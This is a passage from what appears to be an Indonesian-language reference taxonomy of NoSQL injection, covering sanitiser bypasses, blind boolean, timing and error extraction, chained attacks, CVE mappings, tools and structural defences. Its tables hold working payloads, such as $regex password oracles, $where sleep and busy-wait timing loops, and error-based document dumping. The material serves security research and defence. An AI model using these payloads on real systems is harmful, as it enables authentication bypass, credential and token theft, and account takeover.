### §7-2. Bypass Sanitasi Middleware

| Subtipe | Mekanisme | Kondisi Kunci |
|---------|-----------|---------------|
| **Cakupan express-mongo-sanitize** | Menghapus kunci yang dimulai dengan `$` dan yang mengandung `.` dari req.body/query/params/headers. Tidak mensanitasi objek bertumpuk di luar kedalaman yang dikonfigurasi, dan `allowDots: true` menonaktifkan penghapusan titik. | Konfigurasi default dengan kasus edge tertentu |
| **Prototype Pollution Chain** | Jika kerentanan prototype pollution ada di tempat lain dalam aplikasi, mencemari `Object.prototype` dengan kunci operator dapat menyuntikkan operator ke dalam query yang tidak langsung menggunakan input pengguna. | Prasyarat prototype pollution dalam aplikasi yang sama |
| **Pre-Parsing Bypass** | Jika sanitasi berjalan setelah body parsing tetapi sebelum semua middleware, parameter yang terlambat terikat atau body yang di-parse ulang mungkin tidak disanitasi. | Urutan middleware yang kompleks; beberapa body parser |
| **Bypass mongo-sanitize** | Sanitizer yang lebih sederhana yang hanya memeriksa `$` di awal kunci dapat dilewati oleh operator yang tidak menggunakan awalan `$` dalam konteks tertentu. | Menggunakan library sanitasi yang lebih lama atau tidak lengkap |

### §7-3. Permukaan Injeksi Tingkat Framework

| Subtipe | Mekanisme | Kondisi Kunci |
|---------|-----------|---------------|
| **Spring Data MongoDB @Query** | Anotasi `@Query` Spring dengan query berbasis string memungkinkan injeksi jika parameter diinterpolasi daripada terikat. | `@Query("{'field': '?0'}")` dengan input yang tidak diparameterisasi |
| **Spring N1QL @Query** | Mirip dengan di atas tetapi untuk integrasi Couchbase melalui Spring Data. | `@Query("#{#n1ql.selectEntity} WHERE field = '#{[0]}'")` |
| **Django Raw Queries** | Metode `raw()` Django pada backend MongoDB melewati parameterisasi ORM. | `collection.find(json.loads(user_input))` |

---

## §8. Teknik Ekstraksi Blind

Ketika kebocoran data langsung tidak memungkinkan (tidak ada output yang terlihat, tidak ada pesan error), teknik ekstraksi blind menyimpulkan data bit demi bit melalui saluran samping yang dapat diamati.

### §8-1. Ekstraksi Blind Berbasis Boolean

Penyerang menyuntikkan kondisi yang mengubah observasi binary (kode status HTTP, panjang body respons, perilaku redirect) tergantung apakah kondisi itu benar atau salah.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **Operator Boolean Oracle** | Pencocokan prefix `$regex` menghasilkan respons true/false. Iterasi melalui posisi karakter dan nilai untuk merekonstruksi konten field. | `{"username":"admin","password":{"$regex":"^a"}}` → 200; `{"username":"admin","password":{"$regex":"^b"}}` → 401 | Status HTTP atau respons berbeda untuk cocok vs. tidak cocok |
| **$where Boolean Oracle** | Ekspresi JavaScript yang mengakses `this.field[N]` menguji karakter individual. | `admin' && this.password[0]=='a' \|\| 'a'=='b` | JS sisi server diaktifkan; respons diferensial |
| **Field Existence Probing** | `$exists: true` pada berbagai nama field menentukan skema. | `{"secretField":{"$exists":true},"username":"admin"}` | Respons berbeda berdasarkan keberadaan field dalam dokumen yang cocok |
| **Object.keys() Enumeration** | Ekstraksi karakter demi karakter dari nama field melalui pola `Object.keys(this)[N].match()`. | `{"$where":"Object.keys(this)[1].match('^.{0}p.*')"}` | Skema tidak diketahui; SSJI diaktifkan |
| **Strategi Length-First** | Tentukan panjang nilai field dengan regex `.{N}` sebelum memulai ekstraksi karakter, mengoptimalkan proses ekstraksi. | Langkah 1: `{"password":{"$regex":".{8}"}}` → true; `.{9}` → false (panjang=8). Langkah 2: Ekstrak 8 karakter. | Mengurangi total permintaan yang diperlukan |

### §8-2. Ekstraksi Blind Berbasis Timing

Ketika respons identik tanpa memperhatikan hasil query, saluran samping timing memungkinkan ekstraksi.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **sleep() Langsung** | Fungsi `sleep()` MongoDB dalam `$where` menyebabkan penundaan yang dapat diukur saat titik injeksi tercapai. | `{"$where":"sleep(5000)"}` | Mengkonfirmasi injeksi ada; SSJI diaktifkan |
| **sleep() Bersyarat** | `sleep()` dipicu hanya ketika kondisi yang bergantung pada data benar. | `{"$where":"if(this.password[0]=='a'){sleep(5000)}"}` | Ekstraksi per karakter melalui timing |
| **Busy-Wait Loop** | While-loop JavaScript yang memeriksa `new Date()` memberikan timing yang lebih portabel dibandingkan `sleep()`. | `function(x){var w=new Date(new Date().getTime()+5000);while(x.password[0]==='a'&&w>new Date()){}}(this)` | Lingkungan di mana `sleep()` tidak tersedia |
| **Heavy Computation** | Operasi CPU-intensif (backtracking regex, loop besar) menyebabkan penundaan yang dapat diukur tanpa fungsi sleep eksplisit. | `{"$where":"var i=0;while(i<1000000){i++};return this.x=='a'"}` | `sleep()` dinonaktifkan tetapi eksekusi JS diizinkan |
| **N1QL Timing** | Query bertumpuk dengan operasi CPU-intensif di Couchbase menyebabkan penundaan yang dapat terdeteksi. | SELECT bertumpuk dengan operasi ENCODE_JSON yang kompleks | Deployment Couchbase dengan N1QL |

### §8-3. Ekstraksi Berbasis Error

Error yang sengaja dipicu yang menyertakan data dalam pesan error.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **throw new Error()** | Throw JavaScript dalam `$where` menyertakan data dokumen yang diserialisasi dalam pesan error. | `{"$where":"throw new Error(JSON.stringify(this))"}` | Pesan error dikembalikan ke klien; mode debug |
| **Type Coercion Error** | Memaksa error tipe yang menyertakan nilai yang sedang dikonversi dalam pesan error. | Fungsi `Date()` Cypher dengan data non-tanggal | Verbositas error diaktifkan |
| **Syntax Error Fingerprinting** | Menyuntikkan error sintaks untuk mengidentifikasi tipe dan versi mesin database dari format pesan error. | `'"\`{ ;$Foo} $Foo \xYZ` | Pesan error tidak sepenuhnya ditekan |

---

## §9. Serangan Second-Order dan Chained

Payload injeksi NoSQL mungkin tidak dieksekusi segera setelah injeksi, tetapi tetap tersimpan hingga dipicu oleh operasi berikutnya.

### §9-1. Eksekusi Payload Tersimpan

| Subtipe | Mekanisme | Kondisi Kunci |
|---------|-----------|---------------|
| **Second-Order Injection** | Input berbahaya disimpan dalam database dan kemudian digunakan dalam query oleh bagian aplikasi yang berbeda tanpa sanitasi. Misalnya, username yang mengandung `{"$ne":""}` disimpan saat registrasi, kemudian digunakan tanpa sanitasi dalam query pencarian. | Jalur kode yang berbeda untuk penyimpanan vs. pengambilan/penggunaan |
| **Deferred Processing** | Input yang dimasukkan ke dalam antrian untuk pemrosesan latar belakang (antrian pekerjaan, operasi batch) kemudian digunakan dalam query database tanpa validasi ulang. | Pipeline pemrosesan asinkron |
| **Cross-Service Injection** | Data berbahaya yang disimpan oleh satu microservice dikonsumsi oleh layanan lain yang mempercayai data internal dan tidak mensanitasinya sebelum digunakan dalam query. | Arsitektur microservice dengan database bersama |

### §9-2. Eskalasi Rantai Injeksi

| Subtipe | Rantai | Dampak |
|---------|--------|--------|
| **NoSQLi → Authentication Bypass → Account Takeover** | Injeksi operator pada login → akses sebagai admin → kompromi aplikasi penuh | Authentication bypass yang dieskalasi ke akses penuh |
| **NoSQLi → Token Extraction → Password Reset Hijack** | Ekstraksi blind token reset password atau rahasia 2FA → pengambilalihan akun tanpa kredensial | Ekstraksi data blind yang dieskalasi ke pengambilalihan akun |
| **SSRF → Redis → RCE** | Kerentanan SSRF menjangkau layanan Redis → injeksi skrip Lua → eksekusi perintah di host Redis | Chaining tingkat protokol |
| **NoSQLi → Aggregation → Cross-Collection Read → Privilege Escalation** | Injeksi operator dalam find() → pivot ke aggregation pipeline → `$lookup` pada koleksi admin → ekstrak kredensial admin | Eskalasi tingkat query ke dampak tingkat data |
| **NoSQLi → $merge → Data Tampering** | Injeksi aggregation pipeline → `$merge` untuk menimpa peran/izin pengguna dalam koleksi target | Injeksi tingkat baca yang dieskalasi ke dampak tingkat write |
| **Prototype Pollution → NoSQLi** | Prototype pollution mengatur `Object.prototype.$gt = ""` → semua query berikutnya menyertakan operator implisit → bypass universal | Memerlukan kerentanan prototype pollution terpisah |

---

## Pemetaan Skenario Serangan (Sumbu 3)

| Skenario | Arsitektur / Kondisi | Kategori Mutasi Utama |
|----------|---------------------|----------------------|
| **Authentication Bypass** | Form login yang meneruskan input pengguna ke `find()` atau `findOne()` tanpa validasi tipe | §1-1 + §1-2 + §6-1 |
| **Blind Data Exfiltration** | Tidak ada output data langsung; memerlukan ekstraksi karakter berbasis oracle | §1-2 + §3-1 + §8-1 + §8-2 |
| **Direct Data Leakage** | Aplikasi mengembalikan hasil query atau pesan error yang berisi data | §4-1 + §5-1 + §8-3 |
| **Remote Code Execution** | JavaScript sisi server diaktifkan; konteks SSJI dapat dicapai | §3 + §5-6 (Redis Lua) |
| **Cross-Collection Data Access** | Titik injeksi aggregation pipeline ada | §4-1 + §4-3 |
| **Data Modification / Destruction** | Izin write; operasi agregasi atau write langsung dapat diakses | §4-2 + §5-2 (Cypher DELETE) + §5-6 (Redis FLUSHALL) |
| **Server-Side Request Forgery** | N1QL CURL diaktifkan; Redis dapat dijangkau melalui rantai SSRF | §5-1 (N1QL CURL) + §5-6 (Gopher→Redis) |
| **Denial of Service** | Operasi yang membutuhkan sumber daya intensif tersedia (backtracking regex, komputasi JS berat, query bertumpuk N1QL) | §3-1 + §5-1 + §8-2 |
| **WAF / Filter Bypass** | Middleware keamanan diterapkan tetapi dapat dilewati | §6-3 + §7-1 + §7-2 |
| **Account Takeover** | Mekanisme reset password atau 2FA menggunakan token yang dapat di-query | §1-2 + §8-1 + §9-2 |

---

## Pemetaan CVE / Bounty (2023–2025)

| Kombinasi Mutasi | CVE / Kasus | Dampak / Bounty |
|-----------------|-------------|-----------------|
| §7-1 (Mongoose $or nesting bypass) | CVE-2025-23061 (Mongoose < 8.9.5) | RCE melalui `$where` dalam `populate().match()`. Perbaikan tidak lengkap untuk CVE-2024-53900. CVSS 9.1 |
| §7-1 (Mongoose populate().match()) | CVE-2024-53900 (Mongoose < 8.8.3) | RCE melalui injeksi `$where` melalui fungsi `populate().match()` |
| §4-3 ($mergeCursors authorization bypass) | CVE-2025-6713 (MongoDB Server < 8.0.7) | Akses data tidak sah yang melewati RBAC dalam deployment tershard. CVSS 7.7 |
| §1-1 (Injeksi operator pada reset password) | CVE-2024-48573 (AquilaCMS ≤ 1.409.20) | Reset password yang tidak terautentikasi untuk pengguna mana pun termasuk admin |
| §1-1 + §8-1 (Ekstraksi blind token reset) | Rocket.Chat HackerOne #1130874 | Injeksi NoSQL blind post-auth yang membocorkan token reset password dan rahasia 2FA → pengambilalihan akun admin → RCE. Bounty $3.000+ |
| §8-2 (Timing oracle pada selector yang tidak disanitasi) | CVE-2023-28359 (Rocket.Chat) | Ekstraksi data blind berbasis waktu melalui selector MongoDB yang tidak disanitasi |
| §5-1 (Injeksi N1QL di Sync Gateway) | CVE-2019-9039 (Couchbase Sync Gateway) | Injeksi pernyataan N1QL melalui parameter endpoint `_all_docs` |
| §5-5 (Skrip Elasticsearch) | Beberapa CVE (Elasticsearch < 1.2) | Eksekusi kode jarak jauh melalui skrip Groovy dalam query pencarian |
| §5-6 (Redis Lua sandbox escape) | CVE-2022-24735 (Redis < 7.0.0/6.2.7) | Eksekusi kode Lua arbitrer dengan hak istimewa yang ditingkatkan |

---

## Alat Deteksi

| Alat | Cakupan Target | Teknik Inti |
|------|----------------|-------------|
| **NoSQLMap** (Python, open-source) | MongoDB, CouchDB; Redis, Cassandra direncanakan | Injeksi operator otomatis, eksploitasi konfigurasi default, dumping data |
| **nosqli** (Go CLI, open-source) | MongoDB melalui endpoint HTTP | Uji injeksi berbasis error, boolean blind, dan timing |
| **StealthNoSQL** (CLI, open-source) | MongoDB, CouchDB | Enumerasi cerdas: penemuan otomatis database/koleksi/dokumen |
| **N1QLMap** (Python, open-source) | Couchbase N1QL | Eksploitasi injeksi N1QL, ekstraksi data, SSRF melalui CURL |
| **NoSQLi Scanner** (ekstensi Burp Suite) | MongoDB melalui HTTP | Pemindaian pasif/aktif untuk injeksi NoSQL dalam Burp Suite |
| **Burp-NoSQLiScanner** (ekstensi Burp Suite) | MongoDB, NoSQL yang lebih luas | Deteksi otomatis pola injeksi operator dan sintaks |
| **NoSQLAttack** (Python, open-source) | MongoDB | Eksploitasi otomatis kelemahan konfigurasi default dan injeksi |
| **mongoshake / mongo-sanitize** (middleware Node.js) | MongoDB (defensif) | Menghapus kunci berawalan `$` dan `.` dari input pengguna |
| **express-mongo-sanitize** (middleware Node.js) | MongoDB (defensif) | Mensanitasi req.body/query/params/headers; menghapus kunci operator |
| **Mongoose sanitizeFilter** (opsi ODM) | MongoDB melalui Mongoose (defensif) | Sanitasi filter query bawaan (diaktifkan melalui `sanitizeFilter: true`) |

---

## Ringkasan: Prinsip Inti

**Properti Fundamental**: Injeksi NoSQL ada karena database NoSQL menerima *objek query terstruktur* — bukan hanya string — sebagai parameter query. Dalam MongoDB, parameter query dapat berupa nilai skalar (`"admin"`) atau ekspresi operator (`{"$ne":""}`), dan database menginterpretasikannya secara berbeda berdasarkan struktur. Desain ini, di mana bahasa query tertanam dalam format data (JSON), berarti bahwa input pengguna yang tidak divalidasi yang mencapai query dapat membawa logika query bersamanya. Berbeda dengan SQL, di mana batas injeksi selalu berupa parse string (keluar dari tanda kutip), injeksi NoSQL mengeksploitasi *batas tipe* (skalar vs. objek) yang tidak terlihat di tingkat string.

**Mengapa Perbaikan Inkremental Gagal**: Permukaan serangan injeksi NoSQL menolak patching inkremental karena tiga alasan struktural. Pertama, fragmentasi di berbagai mesin database berarti setiap perbaikan bersifat spesifik untuk mesin tersebut — mensanitasi operator MongoDB tidak berpengaruh pada injeksi Cypher atau injeksi perintah Redis. Kedua, permukaan injeksi baru muncul di setiap lapisan abstraksi: API query database, framework agregasi, ODM, middleware, parser parameter HTTP. Perbaikan di satu lapisan (misalnya `express-mongo-sanitize`) dapat dilewati dengan mengeksploitasi lapisan yang berbeda (misalnya content-type switching, prototype pollution, ODM-level populate().match()). Ketiga, nesting operator menciptakan peluang bypass rekursif — seperti yang didemonstrasikan oleh CVE-2025-23061, di mana sanitizer yang memeriksa hanya kunci tingkat atas dilewati dengan menestingkan `$where` di dalam `$or`. Setiap "perbaikan" yang menangani pola nesting tertentu menciptakan perlombaan baru antara defender yang menambahkan pemeriksaan kedalaman dan penyerang yang menemukan jalur nesting baru.

**Solusi Struktural**: Satu-satunya pertahanan yang dapat diandalkan adalah menegakkan batas tipe yang ketat antara input pengguna dan struktur query. Ini berarti: (1) tidak pernah meneruskan objek yang dikontrol pengguna langsung ke dalam query — selalu ekstrak nilai skalar dan bangun objek query di sisi server; (2) memvalidasi tipe input di batas API menggunakan validasi skema (Joi, Ajv, JSON Schema) yang menolak objek/array di mana skalar yang diharapkan; (3) menggunakan query yang diparameterisasi atau query builder yang secara struktural memisahkan nilai pengguna dari operator query; dan (4) menonaktifkan kemampuan yang tidak diperlukan (JavaScript sisi server melalui `--noscripting`, CURL dalam N1QL, skrip Groovy dalam Elasticsearch). Pertahanan harus beroperasi di *tingkat sistem tipe*, bukan *tingkat pola string* — menghapus karakter `$` hanyalah solusi sementara; memastikan input pengguna tidak pernah dapat diinterpretasikan sebagai operator query adalah perbaikan struktural.

---

## Referensi

- PortSwigger Web Security Academy — NoSQL Injection: https://portswigger.net/web-security/nosql-injection
- OWASP Web Security Testing Guide — Testing for NoSQL Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
- PayloadsAllTheThings — NoSQL Injection: https://swisskyrepo.github.io/PayloadsAllTheThings/NoSQL%20Injection/
- HackTricks — NoSQL Injection: https://book.hacktricks.wiki/pentesting-web/nosql-injection.html
- Soroush Dalili — MongoDB NoSQL Injection with Aggregation Pipelines (2024): https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/
- OPSWAT — Technical Discovery of Mongoose CVE-2025-23061 and CVE-2024-53900: https://www.opswat.com/blog/technical-discovery-mongoose-cve-2025-23061-cve-2024-53900
- ZeroPath — MongoDB CVE-2025-6713 Unauthorized Data Access: https://zeropath.com/blog/mongodb-cve-2025-6713-unauthorized-data-access
- WithSecure Labs — N1QL Injection: Kind of SQL Injection in a NoSQL Database: https://labs.withsecure.com/publications/n1ql-injection-kind-of-sql-injection-in-a-nosql-database
- Intigriti — NoSQL Injection Advanced Exploitation Guide: https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-nosql-injection-nosqli-vulnerabilities
- Imperva — NoSQL SSJI Authentication Bypass: https://www.imperva.com/blog/nosql-ssji-authentication-bypass/
- NullSweep — NoSQL Injection Cheatsheet: https://nullsweep.com/nosql-injection-cheatsheet/
- SecOps Group — A Pentester's Guide to NoSQL Injection: https://secops.group/a-pentesters-guide-to-nosql-injection/
- PMC/ScienceDirect — The MongoDB Injection Dataset (2024): https://pmc.ncbi.nlm.nih.gov/articles/PMC10997947/
- Rocket.Chat HackerOne Report #1130874: https://hackerone.com/reports/1130874
- OWASP NoSQL Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html

---

*Dokumen ini dibuat untuk tujuan penelitian keamanan defensif dan pemahaman kerentanan.*